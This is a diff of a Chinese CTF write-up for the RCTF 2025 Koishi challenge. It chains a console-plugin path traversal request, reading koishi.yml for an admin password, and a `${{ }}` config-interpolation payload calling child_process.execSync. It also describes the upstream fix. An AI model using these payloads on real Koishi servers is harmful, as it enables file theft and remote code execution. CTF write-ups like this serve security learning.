@@ -2,151 +2,96 @@
 
 ## 题目简述
 
-Koishi 控制台相关插件暴露了静态文件读取路径，目录穿越可读到运行配置。解法先读取配置拿到后台密码，再利用 Koishi 配置过滤器的模板表达式执行命令，把 `/readflag` 输出写到可访问文件。
+题目运行 Koishi 4.18.x，并启用了 `@koishijs/plugin-console`、`auth`、`config`、`explorer` 等插件。初始用户没有读取根目录 flag 的权限，但旧版 console 插件的资源路由存在任意文件读取；读取 `koishi.yml` 可取得后台管理员密码。登录后，再利用 Koishi 配置中的 `${{ ... }}` 插值执行 JavaScript，把 `/readflag` 的输出写到 Explorer 可读取的位置。
 
 ## 解题过程
 
-### 关键观察
+### 利用 console 插件读取任意文件
 
-Koishi 控制台相关插件暴露了静态文件读取路径，目录穿越可读到运行配置。
+旧版 `@koishijs/plugin-console` 处理 `/@plugin-<key>/...` 路径时，大致执行：
 
-### 求解步骤
+```typescript
+if (name.startsWith('@plugin-')) {
+  const [key] = name.slice(8).split('/', 1)
+  if (this.entries[key]) {
+    const files = makeArray(this.getFiles(this.entries[key].files))
+    const filename = files[0] + name.slice(8 + key.length)
+    ctx.type = extname(filename)
+    if (this.config.devMode || ctx.type !== 'application/javascript') {
+      return sendFile(filename)
+    }
+    // JavaScript 文件才会进入后续转换逻辑
+  }
+}
+```
 
-https://github.com/koishijs/webui/blob/main/plugins/console/src/node/index.ts
-能任意文件读了
-这个是低权限用户，读不了flag
-读配置文件，拿到密码，要后台找个接口rce了
-GET /@plugin-77dvs1bw9wb/../../../../../../../etc/passwd HTTP/1.1
-Host: 127.0.0.1:5140
-sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
-sec-ch-ua-mobile: ?0
-sec-ch-ua-platform: "macOS"
-Accept-Language: zh-CN,zh;q=0.9
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-(KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
-Accept:
-text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im
-age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-plugins:
-  group:server:
-    server:yrt4za:
-      port: 5140
-      maxPort: 5149
-      host: 0.0.0.0
-    ~server-satori:4a5c8c: {}
-    ~server-temp:in16cp: {}
-  group:basic:
-    ~admin:tnisa7: {}
-    ~bind:07uqcj: {}
-    commands:fcfz9r: {}
-    help:tj2694: {}
-    http:c3980a: {}
-    ~inspect:bep4w8: {}
-    locales:10cpca: {}
-    proxy-agent:9hjj24: {}
-    rate-limit:9enlml: {}
-    telemetry:c46z2c: {}
-  group:console:
-    actions:12nvqa: {}
-    analytics:j8afpj: {}
-    android:bo77l9:
-      $if: env.KOISHI_AGENT?.includes('Android')
-    auth:hfi7d9:
-      admin:
-        hint: >-
-          as you can see, you now get the password of admin, try to rce
-without
-          adding any plugins! gogogo! (The container network has been
-          restricted. Please do not attempt any supply chain attacks. Let’s
-work
-          together to maintain the security of the Koishi community.)
-        password: rctf2025gogogotorce
-    config:ab6k8s: {}
-    console:n2unsp:
-      open: false
-    dataview:b4re4p: {}
-    desktop:zvr0sy:
-      $if: env.KOISHI_AGENT?.includes('Desktop')
-    explorer:e6ctyv: {}
-    logger:6t5evk: {}
-    insight:blbpmd: {}
-    market:734ssq:
-      search:
-        endpoint: <https://registry.koishi.chat/index.json>
-    notifier:fjhc7z: {}
-    oobe:pblvay: {}
-    sandbox:a8395u: {}
-    status:mgd9ai: {}
-    theme-vanilla:zw7dvu: {}
-  group:storage:
-    ~database-mongo:e4iopx:
-      database: koishi
-    ~database-mysql:sqfsc4:
-      database: koishi
-    ~database-postgres:yixoph:
-      database: koishi
-    database-sqlite:l9px0e:
-      path: data/koishi.db
-    assets-local:9psdxd: {}
-  group:adapter:
-    ~adapter-dingtalk:nt9ml6: {}
-    ~adapter-discord:cm64td:
-https://koishi.chat/zh-CN/guide/develop/config.html#使用环境变量
-https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/pack
-ages/loader/src/shared.ts#L325
-过滤器模版注入,然后外带信息就好了
-      token: null
-    ~adapter-kook:x2laqr: {}
-    ~adapter-lark:93xiqh: {}
-    ~adapter-line:zwdbcy: {}
-    ~adapter-mail:1yn601: {}
-    ~adapter-matrix:ptr0p2: {}
-    ~adapter-qq:zte6li: {}
-    ~adapter-satori:wqcyyw: {}
-    ~adapter-slack:sfujrd: {}
-    ~adapter-telegram:lffgys: {}
-    ~adapter-wechat-official:k7ypgi: {}
-    ~adapter-wecom:2lxd3k: {}
-    ~adapter-whatsapp:k4wpu1: {}
-    ~adapter-zulip:gdig38: {}
-  group:develop:
-    $if: env.NODE_ENV === 'development'
-    hmr:s1k6y8:
-      root: .
-${{ process.mainModule.require('child_process').execSync('/readflag >
-/koishi/flag') }}
+问题在于 URL 余下部分未经规范化和目录边界校验便直接拼到 `files[0]`。只要目标不是 JavaScript，代码就会把拼出的路径交给 `sendFile()`。因此可先请求 `/etc/passwd` 验证漏洞：
+
+```http
+GET /@plugin-<runtime-key>/../../../../../../../etc/passwd HTTP/1.1
+Host: <challenge-host>:5140
+```
+
+`<runtime-key>` 是当前实例在前端资源 URL 中使用的插件键，不应照抄 WP 中某一次部署的随机值。确认目录穿越后，用同样方式读取 Koishi 工作目录下的 `koishi.yml`。
+
+### 从配置中取得管理员凭据
+
+Koishi 把插件实例及其参数集中写在 `koishi.yml`。题目配置的 `auth` 段包含明文管理员密码：
+
+```yaml
+auth:<instance-id>:
+  admin:
+    hint: >-
+      ... try to rce without adding any plugins ...
+    password: rctf2025gogogotorce
+```
+
+这一步同时给出两个信息：已有账号可以登录控制台；预期解法不能依赖安装恶意插件或访问外网，而应寻找现有插件中的代码执行面。
+
+### 通过配置插值执行 JavaScript
+
+Koishi loader 会递归遍历配置；遇到字符串时，用正则提取 `${{ ... }}`，再通过 `new Function` 创建的求值器在上下文中执行表达式：
+
+```typescript
+interpolate(source: any) {
+  if (typeof source === 'string') {
+    return interpolate(source, this.params, /\$\{\{(.+?)\}\}/g)
+  }
+  // 数组和对象会继续递归处理
+}
+
+const evaluate = new Function('context', 'expr', `
+  try {
+    with (context) {
+      return eval(expr)
+    }
+  } catch {}
+`)
+```
+
+后台 `config` 插件允许修改插件配置，过滤条件等字符串字段也会经过上述插值。选择一个可编辑、重载后会重新读取配置的字段，填入：
+
+```javascript
+${{ process.mainModule.require('child_process')
+    .execSync('/readflag > /koishi/flag') }}
+```
+
+若当前上下文不能直接取到 `require`，等价写法是从全局 `process` 的主模块加载器进入：
+
+```javascript
+${{ global.process.mainModule.constructor
+    ._load('child_process')
+    .exec('/readflag > /koishi/flag') }}
+```
+
+保存配置并重新加载对应插件后，表达式执行 `/readflag`，输出落到 `/koishi/flag`。随后在已经启用的 Explorer 中打开该文件，得到：
+
+```text
 RCTF{You_now_g0t_the_heart_0f_koishi!}
+```
 
-### 参考链接补充
-
-Koishi 相关链接分别确认了任意文件读和后续 RCE 的源码依据：
-
-- `webui/plugins/console/src/node/index.ts` 中，控制台静态路由取 `ctx.path` 后对 `@plugin-` 前缀做特殊处理：`filename = files[0] + name.slice(...)`，再 `resolve(this.root, filename)`。保护条件只检查解析后的路径是否以 `this.root` 开头，或是否包含 `node_modules`；通过插件资源路径拼接 `../` 时，可以把请求落到进程可读文件上。
-- 该路由的 `sendFile()` 直接 `createReadStream(filename)` 返回文件内容，因此可先读 `/etc/passwd` 验证，再读 Koishi 配置拿后台密码/插件配置。
-- Koishi loader 的 `interpolate(source)` 会递归处理字符串、数组和对象，并对字符串执行 `${{ ... }}` 表达式插值；`forkPlugin()` 把 `this.interpolate(config)` 后的配置传给插件，`isTruthyLike()` 也会把表达式包装成 `${{ expr }}` 求值。
-- 官方配置文档说明 Koishi 配置支持环境变量/表达式式写法。结合后台可改配置这一点，可以把过滤器/配置字段变成模板表达式执行面，再把 `/readflag` 结果写到静态可读位置。
-
-### PDF 图片
-
-![GitHub commit 历史中的入口线索](RCTF2025-514s-heart-wp/github-commit-history.png)
-
-![文件管理器中访问 flag 路径的结果](RCTF2025-514s-heart-wp/file-manager-flag-result.png)
-
-### PDF 外链
-
-- <https://github.com/koishijs/webui/blob/main/plugins/console/src/node/index.ts>
-- <https://koishi.chat/zh-CN/guide/develop/config.html#>
-- <https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/packages/loader/src/shared.ts#L325>
+该任意文件读取问题赛后已由上游合并修复。修复的核心是先规范化插件相对路径、拒绝 `..` 路径段，并在读取前确认最终路径仍位于允许目录内；具体讨论见 [koishijs/webui#362](https://github.com/koishijs/webui/pull/362)。正文已经给出漏洞成因与修复原则，不需要依赖链接才能理解利用链。
 
 ## 方法总结
 
-- 核心技巧：插件静态路由目录穿越 + Koishi 配置模板执行。
-- 识别信号：插件资源路径可拼接文件系统路径，后台配置支持 `${{ ... }}` 表达式。
-- 复用要点：先用任意文件读拿配置/凭据，再找无需安装插件的内置执行面。
+完整链路是“插件静态资源目录穿越 → 读取集中配置和管理员密码 → 登录现有控制台 → 配置插值代码执行”。目录穿越阶段应避免照抄动态插件键，先从当前页面资源定位实际键；取得配置后，也不要停在凭据泄露，而应继续审计配置加载器是否把字符串当模板或表达式执行。对于这类管理框架，配置本身既是敏感信息集合，也可能是第二阶段执行入口。
